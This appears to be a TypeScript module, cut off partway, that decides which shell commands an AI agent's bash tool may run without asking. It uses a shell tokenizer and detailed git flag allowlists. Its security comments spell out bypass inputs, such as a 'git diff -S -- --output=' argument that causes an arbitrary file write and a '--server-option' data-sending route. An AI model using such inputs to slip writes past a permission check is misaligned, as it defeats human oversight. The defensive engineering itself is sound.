/**
 * Read-only command classification for the bash tool in default permission
 * mode: commands whose every segment is provably read-only are auto-allowed
 * without prompting.
 *
 * Ported from Claude Code (authoritative sources):
 *   - packages/builtin-tools/src/tools/BashTool/readOnlyValidation.ts
 *     (checkReadOnlyConstraints, isCommandReadOnly, isCommandSafeViaFlagParsing,
 *     COMMAND_ALLOWLIST, READONLY_COMMANDS, READONLY_COMMAND_REGEXES)
 *   - src/utils/shell/readOnlyCommandValidation.ts
 *     (GIT_READ_ONLY_COMMANDS, DOCKER/RIPGREP/PYRIGHT configs, validateFlags,
 *     validateFlagArgument, containsVulnerableUncPath)
 *
 * Deviations from the source (per port spec):
 *   - GH_READ_ONLY_COMMANDS and `aki` are Claude Code ant-only — dropped.
 *   - Windows-only branches skipped: containsVulnerableUncPath is gated behind
 *     IS_WINDOWS = false; the Windows xargs removal and the ant allowlist
 *     extension (getCommandAllowlist) are dropped.
 *   - Analytics (tengu_*) hooks dropped.
 *   - sed's sedCommandIsAllowedByAllowlist (sedValidation.ts, ~687 lines) is
 *     NOT ported: every sed command is conservatively treated as dangerous.
 *   - shell-quote / splitCommand_DEPRECATED replaced by a self-contained
 *     quote-aware tokenizer (tokenizeShellCommand) and segment splitter.
 *     The splitter does NOT replicate splitCommand_DEPRECATED's static
 *     redirection stripping — segments keep their redirections, which only
 *     makes the classification more conservative (redirections never pass the
 *     read-only check).
 *   - stripSafeWrappers is not ported: env-var/timeout-prefixed git commands
 *     are not detected as git for the cd/bare-repo gates, but they still fail
 *     the per-segment read-only check, so the outcome stays "passthrough".
 *   - The SandboxManager/getCwd "git outside original cwd while sandboxing"
 *     gate is dropped (requires omp runtime injection absent from contract).
 *   - splitCommand_DEPRECATED preserves trailing comments as separate
 *     segments (making `ls # comment` fail); the ported splitter drops
 *     comments — safe, because bash never executes comment text.
 *
 * Zero external dependencies (no imports at all).
 */

/** Permission decision shared by the bash security modules. */
export type ReadOnlyCheck = { behavior: "allow" | "ask" | "passthrough"; message?: string };

// ---------------------------------------------------------------------------
// Types (merged from readOnlyCommandValidation.ts + readOnlyValidation.ts)
// ---------------------------------------------------------------------------

export type FlagArgType =
	| "none" // No argument (--color, -n)
	| "number" // Integer argument (--context=3)
	| "string" // Any string argument (--relative=path)
	| "char" // Single character (delimiter)
	| "{}" // Literal "{}" only
	| "EOF" // Literal "EOF" only

export type CommandConfig = {
	safeFlags: Record<string, FlagArgType>;
	// An optional regex used for additional validation beyond flag parsing
	regex?: RegExp;
	// Returns true if the command is dangerous, false if safe.
	// args is the list of tokens AFTER the command name (e.g., after "git branch").
	additionalCommandIsDangerousCallback?: (rawCommand: string, args: string[]) => boolean;
	// When false, the tool does NOT respect POSIX `--` end-of-options.
	// validateFlags will continue checking flags after `--` instead of breaking.
	// Default: true (most tools respect `--`).
	respectsDoubleDash?: boolean;
}

// ---------------------------------------------------------------------------
// Self-contained shell tokenizer (replaces shell-quote / tryParseShellCommand)
// ---------------------------------------------------------------------------

type Token =
	| { kind: "str"; value: string; start: number; end: number }
	| { kind: "op"; value: string; start: number; end: number }
	| { kind: "comment"; value: string; start: number; end: number };

const OPERATOR_CHARS = new Set(["|", "&", ";", "<", ">", "(", ")", "\n"]);

/**
 * Quote-aware tokenizer for a single shell command line.
 *
 * - Single quotes: everything is literal.
 * - Double quotes: `\` escapes only $ ` " \ and newline (bash semantics).
 * - Outside quotes: `\X` is a literal X; `\<newline>` is a line continuation.
 * - `$VAR` stays as literal text (mirrors tryParseShellCommand's
 *   `env => \`$${env}\`` callback): tokens containing `$` are rejected
 *   downstream before any flag/callback validation runs.
 * - Unquoted glob chars are ordinary characters (the read-only path rejects
 *   any unquoted glob via containsUnquotedExpansion before tokens matter).
 * - Unquoted `#` at a token boundary starts a comment (to end of line).
 * - Unterminated quotes make the whole command unparseable (fail-closed).
 */
function tokenizeShellCommand(command: string): { ok: true; tokens: Token[] } | { ok: false } {
	const tokens: Token[] = [];
	let i = 0;
	let current = "";
	let currentStart = -1;
	let touched = false; // current token has content or quoting
	let inSingle = false;
	let inDouble = false;

	const flush = () => {
		if (touched) {
			tokens.push({ kind: "str", value: current, start: currentStart, end: i });
			current = "";
			touched = false;
			currentStart = -1;
		}
	};

	while (i < command.length) {
		const c = command[i];

		if (inSingle) {
			if (c === "'") {
				inSingle = false;
			} else {
				current += c;
			}
			i++;
			continue;
		}

		if (inDouble) {
			if (c === "\\" && i + 1 < command.length) {
				const next = command[i + 1];
				if (next === "$" || next === "`" || next === '"' || next === "\\") {
					current += next;
					i += 2;
				} else if (next === "\n") {
					i += 2; // line continuation inside double quotes
				} else {
					current += c;
					i++;
				}
				continue;
			}
			if (c === '"') {
				inDouble = false;
			} else {
				current += c;
			}
			i++;
			continue;
		}

		// Outside quotes
		if (c === "\\") {
			if (i + 1 >= command.length) {
				// Trailing lone backslash — unparseable, fail closed
				return { ok: false };
			}
			const next = command[i + 1];
			if (next === "\n") {
				i += 2; // line continuation
				continue;
			}
			if (!touched) {
				touched = true;
				currentStart = i;
			}
			current += next;
			i += 2;
			continue;
		}

		if (c === "'") {
			if (!touched) {
				touched = true;
				currentStart = i;
			}
			inSingle = true;
			i++;
			continue;
		}

		if (c === '"') {
			if (!touched) {
				touched = true;
				currentStart = i;
			}
			inDouble = true;
			i++;
			continue;
		}

		if (c === " " || c === "\t" || c === "\r") {
			flush();
			i++;
			continue;
		}

		// Unquoted '#' at a token boundary starts a comment
		if (c === "#" && !touched) {
			let j = i;
			while (j < command.length && command[j] !== "\n") j++;
			tokens.push({ kind: "comment", value: command.slice(i, j), start: i, end: j });
			i = j;
			continue;
		}

		if (OPERATOR_CHARS.has(c)) {
			flush();
			let op = c;
			const n1 = command[i + 1];
			const n2 = command[i + 2];
			if (c === "|") {
				if (n1 === "&") op = "|&";
			} else if (c === "&") {
				if (n1 === "&") op = "&&";
			} else if (c === ";") {
				if (n1 === ";") op = ";;";
				else if (n1 === "&") op = ";&";
			} else if (c === "<") {
				if (n1 === "<") op = "<<";
				else if (n1 === "&") op = "<&";
				else if (n1 === ">") op = "<>";
				if (op === "<<" && n2 === "<") op = "<<<";
			} else if (c === ">") {
				if (n1 === ">") op = ">>";
				else if (n1 === "&") op = ">&";
			}
			tokens.push({ kind: "op", value: op, start: i, end: i + op.length });
			i += op.length;
			continue;
		}

		if (!touched) {
			touched = true;
			currentStart = i;
		}
		current += c;
		i++;
	}

	if (inSingle || inDouble) {
		// Unterminated quote — unparseable, fail closed
		return { ok: false };
	}
	flush();
	return { ok: true, tokens };
}

// ---------------------------------------------------------------------------
// Compound-command segmentation (replaces splitCommand_DEPRECATED)
// ---------------------------------------------------------------------------

/** Control operators that terminate one segment and start the next. */
const SEGMENT_SEPARATORS = new Set(["&&", "||", "|", "|&", ";", ";&", ";;", "&", "(", ")", "\n"]);

/**
 * Splits a compound command into segments on shell control operators
 * (`&& || ; ;& ;; | |& &` and newlines; unquoted subshell parens too).
 *
 * NOTE: unlike splitCommand_DEPRECATED this does NOT strip redirections —
 * segments keep `> file` etc., which fail the read-only check downstream
 * (conservative direction).
 */
function splitIntoSegments(command: string): string[] {
	const result = tokenizeShellCommand(command);
	if (!result.ok) {
		// Unparseable: treat the whole command as one segment (fail closed —
		// callers reject unparsable commands before reaching the split).
		return [command];
	}
	const segments: string[] = [];
	let segStart = 0;
	for (const tok of result.tokens) {
		const isSeparator = tok.kind === "op" && SEGMENT_SEPARATORS.has(tok.value);
		if (isSeparator || tok.kind === "comment") {
			const seg = command.slice(segStart, tok.start).trim();
			if (seg) segments.push(seg);
			segStart = tok.end;
		}
	}
	const tail = command.slice(segStart).trim();
	if (tail) segments.push(tail);
	return segments;
}

// ---------------------------------------------------------------------------
// Shared git flag groups
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
	"--all": "none",
	"--branches": "none",
	"--tags": "none",
	"--remotes": "none",
}

const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
	"--since": "string",
	"--after": "string",
	"--until": "string",
	"--before": "string",
}

const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
	"--oneline": "none",
	"--graph": "none",
	"--decorate": "none",
	"--no-decorate": "none",
	"--date": "string",
	"--relative-date": "none",
}

const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
	"--max-count": "number",
	"-n": "number",
}

// Stat output flags - used in git log, show, diff
const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
	"--stat": "none",
	"--numstat": "none",
	"--shortstat": "none",
	"--name-only": "none",
	"--name-status": "none",
}

// Color output flags - used in git log, show, diff
const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
	"--color": "none",
	"--no-color": "none",
}

// Patch display flags - used in git log, show
const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
	"--patch": "none",
	"-p": "none",
	"--no-patch": "none",
	"--no-ext-diff": "none",
	"-s": "none",
}

// Author/committer filter flags - used in git log, reflog
const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
	"--author": "string",
	"--committer": "string",
	"--grep": "string",
}

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS — complete map of all git subcommands (24 keys)
// ---------------------------------------------------------------------------

export const GIT_READ_ONLY_COMMANDS: Record<string, CommandConfig> = {
	"git diff": {
		safeFlags: {
			...GIT_STAT_FLAGS,
			...GIT_COLOR_FLAGS,
			// Display and comparison flags
			"--dirstat": "none",
			"--summary": "none",
			"--patch-with-stat": "none",
			"--word-diff": "none",
			"--word-diff-regex": "string",
			"--color-words": "none",
			"--no-renames": "none",
			"--no-ext-diff": "none",
			"--check": "none",
			"--ws-error-highlight": "string",
			"--full-index": "none",
			"--binary": "none",
			"--abbrev": "number",
			"--break-rewrites": "none",
			"--find-renames": "none",
			"--find-copies": "none",
			"--find-copies-harder": "none",
			"--irreversible-delete": "none",
			"--diff-algorithm": "string",
			"--histogram": "none",
			"--patience": "none",
			"--minimal": "none",
			"--ignore-space-at-eol": "none",
			"--ignore-space-change": "none",
			"--ignore-all-space": "none",
			"--ignore-blank-lines": "none",
			"--inter-hunk-context": "number",
			"--function-context": "none",
			"--exit-code": "none",
			"--quiet": "none",
			"--cached": "none",
			"--staged": "none",
			"--pickaxe-regex": "none",
			"--pickaxe-all": "none",
			"--no-index": "none",
			"--relative": "string",
			// Diff filtering
			"--diff-filter": "string",
			// Short flags
			"-p": "none",
			"-u": "none",
			"-s": "none",
			"-M": "none",
			"-C": "none",
			"-B": "none",
			"-D": "none",
			"-l": "none",
			// SECURITY: -S/-G/-O take REQUIRED string arguments (pickaxe search,
			// pickaxe regex, orderfile). Previously 'none' caused a parser
			// differential with git: `git diff -S -- --output=/tmp/pwned` —
			// validator sees -S as no-arg → advances 1 token → breaks on `--` →
			// --output unchecked. git sees -S requires arg → consumes `--` as the
			// pickaxe string (standard getopt: required-arg options consume next
			// argv unconditionally, BEFORE the top-level `--` check) → cursor at
			// --output=... → parses as long option → ARBITRARY FILE WRITE.
			// git log config correctly has -S/-G as 'string'.
			"-S": "string",
			"-G": "string",
			"-O": "string",
			"-R": "none",
		},
	},
	"git log": {
		safeFlags: {
			...GIT_LOG_DISPLAY_FLAGS,
			...GIT_REF_SELECTION_FLAGS,
			...GIT_DATE_FILTER_FLAGS,
			...GIT_COUNT_FLAGS,
			...GIT_STAT_FLAGS,
			...GIT_COLOR_FLAGS,
			...GIT_PATCH_FLAGS,
			...GIT_AUTHOR_FILTER_FLAGS,
			// Additional display flags
			"--abbrev-commit": "none",
			"--full-history": "none",
			"--dense": "none",
			"--sparse": "none",
			"--simplify-merges": "none",
			"--ancestry-path": "none",
			"--source": "none",
			"--first-parent": "none",
			"--merges": "none",
			"--no-merges": "none",
			"--reverse": "none",
			"--walk-reflogs": "none",
			"--skip": "number",
			"--max-age": "number",
			"--min-age": "number",
			"--no-min-parents": "none",
			"--no-max-parents": "none",
			"--follow": "none",
			// Commit traversal flags
			"--no-walk": "none",
			"--left-right": "none",
			"--cherry-mark": "none",
			"--cherry-pick": "none",
			"--boundary": "none",
			// Ordering flags
			"--topo-order": "none",
			"--date-order": "none",
			"--author-date-order": "none",
			// Format control
			"--pretty": "string",
			"--format": "string",
			// Diff filtering
			"--diff-filter": "string",
			// Pickaxe search (find commits that add/remove string)
			"-S": "string",
			"-G": "string",
			"--pickaxe-regex": "none",
			"--pickaxe-all": "none",
		},
	},
	"git show": {
		safeFlags: {
			...GIT_LOG_DISPLAY_FLAGS,
			...GIT_STAT_FLAGS,
			...GIT_COLOR_FLAGS,
			...GIT_PATCH_FLAGS,
			// Additional display flags
			"--abbrev-commit": "none",
			"--word-diff": "none",
			"--word-diff-regex": "string",
			"--color-words": "none",
			"--pretty": "string",
			"--format": "string",
			"--first-parent": "none",
			"--raw": "none",
			// Diff filtering
			"--diff-filter": "string",
			// Short flags
			"-m": "none",
			"--quiet": "none",
		},
	},
	"git shortlog": {
		safeFlags: {
			...GIT_REF_SELECTION_FLAGS,
			...GIT_DATE_FILTER_FLAGS,
			// Summary options
			"-s": "none",
			"--summary": "none",
			"-n": "none",
			"--numbered": "none",
			"-e": "none",
			"--email": "none",
			"-c": "none",
			"--committer": "none",
			// Grouping
			"--group": "string",
			// Formatting
			"--format": "string",
			// Filtering
			"--no-merges": "none",
			"--author": "string",
		},
	},
	"git reflog": {
		safeFlags: {
			...GIT_LOG_DISPLAY_FLAGS,
			...GIT_REF_SELECTION_FLAGS,
			...GIT_DATE_FILTER_FLAGS,
			...GIT_COUNT_FLAGS,
			...GIT_AUTHOR_FILTER_FLAGS,
		},
		// SECURITY: Block `git reflog expire` (positional subcommand) — it writes
		// to .git/logs/** by expiring reflog entries. `git reflog delete` similarly
		// writes. Only `git reflog` (bare = show) and `git reflog show` are safe.
		// The positional-arg fallthrough would otherwise accept `expire`
		// as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS → passes.
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Block known write-capable subcommands: expire, delete, exists.
			// Allow: `show`, ref names (HEAD, refs/*, branch names).
			// The subcommand (if any) is the first positional arg. Subsequent
			// positionals after `show` or after flags are ref names (safe).
			const DANGEROUS_SUBCOMMANDS = new Set(["expire", "delete", "exists"])
			for (const token of args) {
				if (!token || token.startsWith("-")) continue
				// First non-flag positional: check if it's a dangerous subcommand.
				// If it's `show` or a ref name like `HEAD`/`refs/...`, safe.
				if (DANGEROUS_SUBCOMMANDS.has(token)) {
					return true // Dangerous subcommand — writes to .git/logs/**
				}
				// First positional is safe (show/HEAD/ref) — subsequent are ref args
				return false
			}
			return false // No positional = bare `git reflog` = safe (shows reflog)
		},
	},
	"git stash list": {
		safeFlags: {
			...GIT_LOG_DISPLAY_FLAGS,
			...GIT_REF_SELECTION_FLAGS,
			...GIT_COUNT_FLAGS,
		},
	},
	"git ls-remote": {
		safeFlags: {
			// Branch/tag filtering flags
			"--branches": "none",
			"-b": "none",
			"--tags": "none",
			"-t": "none",
			"--heads": "none",
			"-h": "none",
			"--refs": "none",
			// Output control flags
			"--quiet": "none",
			"-q": "none",
			"--exit-code": "none",
			"--get-url": "none",
			"--symref": "none",
			// Sorting flags
			"--sort": "string",
			// Protocol flags
			// SECURITY: --server-option and -o are INTENTIONALLY EXCLUDED. They
			// transmit an arbitrary attacker-controlled string to the remote git
			// server in the protocol v2 capability advertisement. This is a network
			// WRITE primitive (sending data to remote) on what is supposed to be a
			// read-only command. Even without command substitution (which is caught
			// elsewhere), `--server-option="sensitive-data"` exfiltrates the value
			// to whatever `origin` points to. The read-only path should never enable
			// network writes.
		},
	},
	"git status": {
		safeFlags: {
			// Output format flags
			"--short": "none",
			"-s": "none",
			"--branch": "none",
			"-b": "none",
			"--porcelain": "none",
			"--long": "none",
			"--verbose": "none",
			"-v": "none",
			// Untracked files handling
			"--untracked-files": "string",
			"-u": "string",
			// Ignore options
			"--ignored": "none",
			"--ignore-submodules": "string",
			// Column display
			"--column": "none",
			"--no-column": "none",
			// Ahead/behind info
			"--ahead-behind": "none",
			"--no-ahead-behind": "none",
			// Rename detection
			"--renames": "none",
			"--no-renames": "none",
			"--find-renames": "string",
			"-M": "string",
		},
	},
	"git blame": {
		safeFlags: {
			...GIT_COLOR_FLAGS,
			// Line range
			"-L": "string",
			// Output format
			"--porcelain": "none",
			"-p": "none",
			"--line-porcelain": "none",
			"--incremental": "none",
			"--root": "none",
			"--show-stats": "none",
			"--show-name": "none",
			"--show-number": "none",
			"-n": "none",
			"--show-email": "none",
			"-e": "none",
			"-f": "none",
			// Date formatting
			"--date": "string",
			// Ignore whitespace
			"-w": "none",
			// Ignore revisions
			"--ignore-rev": "string",
			"--ignore-revs-file": "string",
			// Move/copy detection
			"-M": "none",
			"-C": "none",
			"--score-debug": "none",
			// Abbreviation
			"--abbrev": "number",
			// Other options
			"-s": "none",
			"-l": "none",
			"-t": "none",
		},
	},
	"git ls-files": {
		safeFlags: {
			// File selection
			"--cached": "none",
			"-c": "none",
			"--deleted": "none",
			"-d": "none",
			"--modified": "none",
			"-m": "none",
			"--others": "none",
			"-o": "none",
			"--ignored": "none",
			"-i": "none",
			"--stage": "none",
			"-s": "none",
			"--killed": "none",
			"-k": "none",
			"--unmerged": "none",
			"-u": "none",
			// Output format
			"--directory": "none",
			"--no-empty-directory": "none",
			"--eol": "none",
			"--full-name": "none",
			"--abbrev": "number",
			"--debug": "none",
			"-z": "none",
			"-t": "none",
			"-v": "none",
			"-f": "none",
			// Exclude patterns
			"--exclude": "string",
			"-x": "string",
			"--exclude-from": "string",
			"-X": "string",
			"--exclude-per-directory": "string",
			"--exclude-standard": "none",
			// Error handling
			"--error-unmatch": "none",
			// Recursion
			"--recurse-submodules": "none",
		},
	},
	"git config --get": {
		safeFlags: {
			// No additional flags needed - just reading config values
			"--local": "none",
			"--global": "none",
			"--system": "none",
			"--worktree": "none",
			"--default": "string",
			"--type": "string",
			"--bool": "none",
			"--int": "none",
			"--bool-or-int": "none",
			"--path": "none",
			"--expiry-date": "none",
			"-z": "none",
			"--null": "none",
			"--name-only": "none",
			"--show-origin": "none",
			"--show-scope": "none",
		},
	},
	// NOTE: 'git remote show' must come BEFORE 'git remote' so longer patterns are matched first
	"git remote show": {
		safeFlags: {
			"-n": "none",
		},
		// Only allow optional -n, then one alphanumeric remote name
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Filter out the known safe flag
			const positional = args.filter(a => a !== "-n")
			// Must have exactly one positional arg that looks like a remote name
			if (positional.length !== 1) return true
			return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!)
		},
	},
	"git remote": {
		safeFlags: {
			"-v": "none",
			"--verbose": "none",
		},
		// Only allow bare 'git remote' or 'git remote -v/--verbose'
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// All args must be known safe flags; no positional args allowed
			return args.some(a => a !== "-v" && a !== "--verbose")
		},
	},
	// git merge-base is a read-only command for finding common ancestors
	"git merge-base": {
		safeFlags: {
			"--is-ancestor": "none", // Check if first commit is ancestor of second
			"--fork-point": "none", // Find fork point
			"--octopus": "none", // Find best common ancestors for multiple refs
			"--independent": "none", // Filter independent refs
			"--all": "none", // Output all merge bases
		},
	},
	// git rev-parse is a pure read command — resolves refs to SHAs, queries repo paths
	"git rev-parse": {
		safeFlags: {
			// SHA resolution and verification
			"--verify": "none", // Verify that exactly one argument is a valid object name
			"--short": "string", // Abbreviate output (optional length via =N)
			"--abbrev-ref": "none", // Symbolic name of ref
			"--symbolic": "none", // Output symbolic names
			"--symbolic-full-name": "none", // Full symbolic name including refs/heads/ prefix
			// Repository path queries (all read-only)
			"--show-toplevel": "none", // Absolute path of top-level directory
			"--show-cdup": "none", // Path components to traverse up to top-level
			"--show-prefix": "none", // Relative path from top-level to cwd
			"--git-dir": "none", // Path to .git directory
			"--git-common-dir": "none", // Path to common directory (.git in main worktree)
			"--absolute-git-dir": "none", // Absolute path to .git directory
			"--show-superproject-working-tree": "none", // Superproject root (if submodule)
			// Boolean queries
			"--is-inside-work-tree": "none",
			"--is-inside-git-dir": "none",
			"--is-bare-repository": "none",
			"--is-shallow-repository": "none",
			"--is-shallow-update": "none",
			"--path-prefix": "none",
		},
	},
	// git rev-list is read-only commit enumeration — lists/counts commits reachable from refs
	"git rev-list": {
		safeFlags: {
			...GIT_REF_SELECTION_FLAGS,
			...GIT_DATE_FILTER_FLAGS,
			...GIT_COUNT_FLAGS,
			...GIT_AUTHOR_FILTER_FLAGS,
			// Counting
			"--count": "none", // Output commit count instead of listing
			// Traversal control
			"--reverse": "none",
			"--first-parent": "none",
			"--ancestry-path": "none",
			"--merges": "none",
			"--no-merges": "none",
			"--min-parents": "number",
			"--max-parents": "number",
			"--no-min-parents": "none",
			"--no-max-parents": "none",
			"--skip": "number",
			"--max-age": "number",
			"--min-age": "number",
			"--walk-reflogs": "none",
			// Output formatting
			"--oneline": "none",
			"--abbrev-commit": "none",
			"--pretty": "string",
			"--format": "string",
			"--abbrev": "number",
			"--full-history": "none",
			"--dense": "none",
			"--sparse": "none",
			"--source": "none",
			"--graph": "none",
		},
	},
	// git describe is read-only — describes commits relative to the most recent tag
	"git describe": {
		safeFlags: {
			// Tag selection
			"--tags": "none", // Consider all tags, not just annotated
			"--match": "string", // Only consider tags matching the glob pattern
			"--exclude": "string", // Do not consider tags matching the glob pattern
			// Output control
			"--long": "none", // Always output long format (tag-distance-ghash)
			"--abbrev": "number", // Abbreviate objectname to N hex digits
			"--always": "none", // Show uniquely abbreviated object as fallback
			"--contains": "none", // Find tag that comes after the commit
			"--first-match": "none", // Prefer tags closest to the tip (stops after first match)
			"--exact-match": "none", // Only output if an exact match (tag points at commit)
			"--candidates": "number", // Limit walk before selecting best candidates
			// Suffix/dirty markers
			"--dirty": "none", // Append "-dirty" if working tree has modifications
			"--broken": "none", // Append "-broken" if repository is in invalid state
		},
	},
	// git cat-file is read-only object inspection — displays type, size, or content of objects
	// NOTE: --batch (without --check) is intentionally excluded — it reads arbitrary objects
	// from stdin which could be exploited in piped commands to dump sensitive objects.
	"git cat-file": {
		safeFlags: {
			// Object query modes (all purely read-only)
			"-t": "none", // Print type of object
			"-s": "none", // Print size of object
			"-p": "none", // Pretty-print object contents
			"-e": "none", // Exit with zero if object exists, non-zero otherwise
			// Batch mode — read-only check variant only
			"--batch-check": "none", // For each object on stdin, print type and size (no content)
			// Output control
			"--allow-undetermined-type": "none",
		},
	},
	// git for-each-ref is read-only ref iteration — lists refs with optional formatting and filtering
	"git for-each-ref": {
		safeFlags: {
			// Output formatting
			"--format": "string", // Format string using %(fieldname) placeholders
			// Sorting
			"--sort": "string", // Sort by key (e.g., refname, creatordate, version:refname)
			// Limiting
			"--count": "number", // Limit output to at most N refs
			// Filtering
			"--contains": "string", // Only list refs that contain specified commit
			"--no-contains": "string", // Only list refs that do NOT contain specified commit
			"--merged": "string", // Only list refs reachable from specified commit
			"--no-merged": "string", // Only list refs NOT reachable from specified commit
			"--points-at": "string", // Only list refs pointing at specified object
		},
	},
	// git grep is read-only — searches tracked files for patterns
	"git grep": {
		safeFlags: {
			// Pattern matching modes
			"-e": "string", // Pattern
			"-E": "none", // Extended regexp
			"--extended-regexp": "none",
			"-G": "none", // Basic regexp (default)
			"--basic-regexp": "none",
			"-F": "none", // Fixed strings
			"--fixed-strings": "none",
			"-P": "none", // Perl regexp
			"--perl-regexp": "none",
			// Match control
			"-i": "none", // Ignore case
			"--ignore-case": "none",
			"-v": "none", // Invert match
			"--invert-match": "none",
			"-w": "none", // Word regexp
			"--word-regexp": "none",
			// Output control
			"-n": "none", // Line number
			"--line-number": "none",
			"-c": "none", // Count
			"--count": "none",
			"-l": "none", // Files with matches
			"--files-with-matches": "none",
			"-L": "none", // Files without match
			"--files-without-match": "none",
			"-h": "none", // No filename
			"-H": "none", // With filename
			"--heading": "none",
			"--break": "none",
			"--full-name": "none",
			"--color": "none",
			"--no-color": "none",
			"-o": "none", // Only matching
			"--only-matching": "none",
			// Context
			"-A": "number", // After context
			"--after-context": "number",
			"-B": "number", // Before context
			"--before-context": "number",
			"-C": "number", // Context
			"--context": "number",
			// Boolean operators for multi-pattern
			"--and": "none",
			"--or": "none",
			"--not": "none",
			// Scope control
			"--max-depth": "number",
			"--untracked": "none",
			"--no-index": "none",
			"--recurse-submodules": "none",
			"--cached": "none",
			// Threads
			"--threads": "number",
			// Quiet
			"-q": "none",
			"--quiet": "none",
		},
	},
	// git stash show is read-only — displays diff of a stash entry
	"git stash show": {
		safeFlags: {
			...GIT_STAT_FLAGS,
			...GIT_COLOR_FLAGS,
			...GIT_PATCH_FLAGS,
			// Diff options
			"--word-diff": "none",
			"--word-diff-regex": "string",
			"--diff-filter": "string",
			"--abbrev": "number",
		},
	},
	// git worktree list is read-only — lists linked working trees
	"git worktree list": {
		safeFlags: {
			"--porcelain": "none",
			"-v": "none",
			"--verbose": "none",
			"--expire": "string",
		},
	},
	"git tag": {
		safeFlags: {
			// List mode flags
			"-l": "none",
			"--list": "none",
			"-n": "number",
			"--contains": "string",
			"--no-contains": "string",
			"--merged": "string",
			"--no-merged": "string",
			"--sort": "string",
			"--format": "string",
			"--points-at": "string",
			"--column": "none",
			"--no-column": "none",
			"-i": "none",
			"--ignore-case": "none",
		},
		// SECURITY: Block tag creation via positional arguments. `git tag foo`
		// creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
		// This is identical semantics to `git branch foo` (which has the same
		// callback below). Without this callback, validateFlags's default
		// positional-arg fallthrough accepts `mytag` as a non-flag arg,
		// and git tag auto-approves. While the write is constrained (path limited
		// to .git/refs/tags/, content is fixed HEAD SHA), it violates the
		// read-only invariant and can pollute CI/CD tag-pattern matching or make
		// abandoned commits reachable via `git tag foo <commit>`.
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Safe uses: `git tag` (list), `git tag -l pattern` (list filtered),
			// `git tag --contains <ref>` (list containing). A bare positional arg
			// without -l/--list is a tag name to CREATE — dangerous.
			const flagsWithArgs = new Set([
				"--contains",
				"--no-contains",
				"--merged",
				"--no-merged",
				"--points-at",
				"--sort",
				"--format",
				"-n",
			])
			let i = 0
			let seenListFlag = false
			let seenDashDash = false
			while (i < args.length) {
				const token = args[i]
				if (!token) {
					i++
					continue
				}
				// `--` ends flag parsing. All subsequent tokens are positional args,
				// even if they start with `-`. `git tag -- -l` CREATES a tag named `-l`.
				if (token === "--" && !seenDashDash) {
					seenDashDash = true
					i++
					continue
				}
				if (!seenDashDash && token.startsWith("-")) {
					// Check for -l/--list (exact or in a bundle). `-li` bundles -l and
					// -i — both 'none' type. Array.includes('-l') exact-matches, missing
					// bundles like `-li`, `-il`. Check individual chars for short bundles.
					if (token === "--list" || token === "-l") {
						seenListFlag = true
					} else if (
						token[0] === "-" &&
						token[1] !== "-" &&
						token.length > 2 &&
						!token.includes("=") &&
						token.slice(1).includes("l")
					) {
						// Short-flag bundle like -li, -il containing 'l'
						seenListFlag = true
					}
					if (token.includes("=")) {
						i++
					} else if (flagsWithArgs.has(token)) {
						i += 2
					} else {
						i++
					}
				} else {
					// Non-flag positional arg (or post-`--` positional). Safe only if
					// preceded by -l/--list (then it's a pattern, not a tag name).
					if (!seenListFlag) {
						return true // Positional arg without --list = tag creation
					}
					i++
				}
			}
			return false
		},
	},
	"git branch": {
		safeFlags: {
			// List mode flags
			"-l": "none",
			"--list": "none",
			"-a": "none",
			"--all": "none",
			"-r": "none",
			"--remotes": "none",
			"-v": "none",
			"-vv": "none",
			"--verbose": "none",
			// Display options
			"--color": "none",
			"--no-color": "none",
			"--column": "none",
			"--no-column": "none",
			// SECURITY: --abbrev stays 'number' so validateFlags accepts --abbrev=N
			// (attached form, safe). The DETACHED form `--abbrev N` is the bug:
			// git uses PARSE_OPT_OPTARG (optional-attached only) — detached N becomes
			// a POSITIONAL branch name, creating .git/refs/heads/N. validateFlags
			// with 'number' consumes N, but the CALLBACK below catches it: --abbrev
			// is NOT in callback's flagsWithArgs (removed), so callback sees N as a
			// positional without list flag → dangerous. Two-layer defense: validate-
			// Flags accepts both forms, callback blocks detached.
			"--abbrev": "number",
			"--no-abbrev": "none",
			// Filtering - these take commit/ref arguments
			"--contains": "string",
			"--no-contains": "string",
			"--merged": "none", // Optional commit argument - handled in callback
			"--no-merged": "none", // Optional commit argument - handled in callback
			"--points-at": "string",
			// Sorting
			"--sort": "string",
			// Note: --format is intentionally excluded as it could pose security risks
			// Show current
			"--show-current": "none",
			"-i": "none",
			"--ignore-case": "none",
		},
		// Block branch creation via positional arguments (e.g., "git branch newbranch")
		// Flag validation is handled by safeFlags above
		// args is tokens after "git branch"
		additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
			// Block branch creation: "git branch <name>" or "git branch <name> <start-point>"
			// Only safe uses are: "git branch" (list), "git branch -flags" (list with options),
			// or "git branch --contains/--merged/etc <ref>" (filtering)
			// Flags that require an argument
			const flagsWithArgs = new Set([
				"--contains",
				"--no-contains",
				"--points-at",
				"--sort",
				// --abbrev REMOVED: git does NOT consume detached arg (PARSE_OPT_OPTARG)
			])
			// Flags with optional arguments (don't require, but can take one)
			const flagsWithOptionalArgs = new Set(["--merged", "--no-merged"])
			let i = 0
			let lastFlag = ""
			let seenListFlag = false
			let seenDashDash = false
			while (i < args.length) {
				const token = args[i]
				if (!token) {
					i++
					continue
				}
				// `--` ends flag parsing. `git branch -- -l` CREATES a branch named `-l`.
				if (token === "--" && !seenDashDash) {
					seenDashDash = true
					lastFlag = ""
					i++
					continue
				}
				if (!seenDashDash && token.startsWith("-")) {
					// Check for -l/--list including short-flag bundles (-li, -la, etc.)
					if (token === "--list" || token === "-l") {
						seenListFlag = true
					} else if (
